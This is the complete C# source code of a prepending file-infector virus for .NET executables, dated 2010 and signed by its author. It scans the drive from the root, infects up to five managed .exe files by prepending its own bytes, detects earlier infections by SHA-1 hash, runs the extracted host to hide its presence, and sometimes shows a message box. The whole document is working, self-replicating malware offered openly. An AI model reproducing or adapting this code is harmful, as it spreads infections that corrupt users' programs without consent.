﻿// msil.alc0paul.IsPogi
//
// october 28, 2010
// 
// features:
//
// - scans hard drive for msil files. infect first 5 files that aren't infected. skips infected files.
// - infection routine is by prepending itself to host file.
// - when executing infected files, the virus is executed first then transfers control to host file
// - displays a messagebox at 25% probability
//
// note: the code is based on msil.syra.d and vitaminc version 2.
//
// alc0paul <bangingatbang@land.ru>
// http://alcopaul.co.nr 
//

using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;


namespace alc0paul
{
    public class IsPogi
    {
        public class w32api // include legacy technique for code demonstration
        {
            [DllImport("user32.dll", CharSet = CharSet.Auto)]
            public static extern int MessageBox(int hWnd, String text, String caption, uint type);
        }
        private static int counter = 0;
        static void Main(string[] args)
        {
            string xx = Path.GetDirectoryName(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName);
            string xy = Directory.GetDirectoryRoot(xx);
            System.IO.DirectoryInfo dir = new System.IO.DirectoryInfo(@xy);
            int yy = AndLetsRock(dir);

            FileStream fs1 = new FileStream(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
            int host = (int)fs1.Length;
            int vir = host - 7680;
            byte[] bytes = Read(fs1, vir, 7680);
            fs1.Close();
            // save host to file
            Random ran = new Random();
            int ty = ran.Next(2000);
            FileStream fs11 = new FileStream("p" + ty + "h.exe", FileMode.OpenOrCreate, FileAccess.Write);
            Write(fs11, bytes);
            fs11.Close();

            // execute host
            try
            {
                Process x = Process.Start("p" + ty + "h.exe");
                x.WaitForExit();
            }
            catch
            {
                ;
            }
            finally
            {
                File.Delete("p" + ty + "h.exe");
            }
            // display message @ 25% probability
            Random t = new Random();
            if (t.Next(4) == 3)
            w32api.MessageBox(0, "::::what must give light must endure burning - frankl::::", "by alcopaul", 0);

        }
        private static int AndLetsRock(DirectoryInfo d)
        {
            FileInfo[] files = d.GetFiles("*.exe");
            foreach (FileInfo file in files)
            {
                string filename = file.FullName;
                try
                {

                    AssemblyName.GetAssemblyName(filename); //check exe if msil
                    if (Sha1(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName) == Sha1(filename)) // get sha1
                        continue;
                    else
                        try
                        {
                            //Console.WriteLine(filename);
                            bool yu = Infect(filename); // the meat of the routine
                            if (yu == false)
                            {
                                counter++;
                            }
                        }
                        catch
                        {
                            continue; // error infecting file (maybe it's running/readonly/etc.) .. goto next file
                        }
                    if (counter == 5)
                    {
                        return 0; // end after 5 infections
                    }
                }
                catch { continue; } //not msil, next file

            }
            DirectoryInfo[] dirs = d.GetDirectories("*.*");
            foreach (DirectoryInfo dir in dirs)
            {
                try
                {
                    if (counter == 5)
                    {
                        return 0;
                    }
                    int yyy = AndLetsRock(dir);
                }
                catch { continue; }
            }
            return 1;
        }
        public static byte[] Read(FileStream s, int length, int c)
        {
            BinaryReader w33 = new BinaryReader(s);
            w33.BaseStream.Seek(c, SeekOrigin.Begin);
            byte[] bytes2 = new byte[length];
            int numBytesToRead2 = (int)length;
            int numBytesRead2 = 0;
            while (numBytesToRead2 > 0)
            {
                int n = w33.Read(bytes2, numBytesRead2, numBytesToRead2);
                if (n == 0)
                    break;
                numBytesRead2 += n;
                numBytesToRead2 -= n;
            }
            w33.Close();
            return bytes2;
        }
        public static bool Infect(string host)
        {
            // read self
            Module mod = Assembly.GetExecutingAssembly().GetModules()[0];
            FileStream fs = new FileStream(mod.FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
            byte[] bytes = Read(fs, 7680, 0);
            fs.Close();
            // read host
            FileStream fs133 = new FileStream(host, FileMode.OpenOrCreate, FileAccess.Read);
            int i = (int)fs133.Length;
            byte[] bytes2 = Read(fs133, i, 0);
            fs133.Close();


            // save self + host to hostfile
            FileStream fs1 = new FileStream(host, FileMode.OpenOrCreate, FileAccess.Write);
            WriteX(fs1, bytes, bytes2);
            fs1.Close();
            return false;
        }
        public static void Write(FileStream s, byte[] g)
        {
            BinaryWriter w = new BinaryWriter(s);
            w.BaseStream.Seek(0, SeekOrigin.Begin);
            w.Write(g);
            w.Flush();
            w.Close();
        }
        public static void WriteX(FileStream s, byte[] g, byte[] k)
        {
            BinaryWriter w = new BinaryWriter(s);
            w.BaseStream.Seek(0, SeekOrigin.Begin);
            w.Write(g);
            w.Write(k);
            w.Flush();
            w.Close();
        }
        public static string Sha1(string data) // get SHA1 of first 2048 bytes of input file
        {
            // why 2048? 2048 is the minimun file size that ilasm produces... we don't want some errors to happen here, ei!
            FileStream FSsha = new FileStream(data, FileMode.OpenOrCreate, FileAccess.Read);
            byte[] Bsha = Read(FSsha, 2048, 0);
            FSsha.Close();
            SHA1 sha = new SHA1CryptoServiceProvider();
            byte[] result = sha.ComputeHash(Bsha); // result contains the SHA1 byte represention of the 2048 input data
            return BytesToHexString(result); // we need to convert that byte rep to hex rep..
        }
        static String BytesToHexString(byte[] bytes) // excerpt from http://support.microsoft.com/default.aspx?scid=kb;en-us;Q312906
        {						// antivirus companies must thank virus writers and we, virus writers must
            // thank microsoft.. :)
            StringBuilder hexString = new StringBuilder(64);
            for (int counter = 0; counter < bytes.Length; counter++)
            {
                hexString.Append(String.Format("{0:X2}", bytes[counter]));
            }
            return hexString.ToString();
        }
    }
}



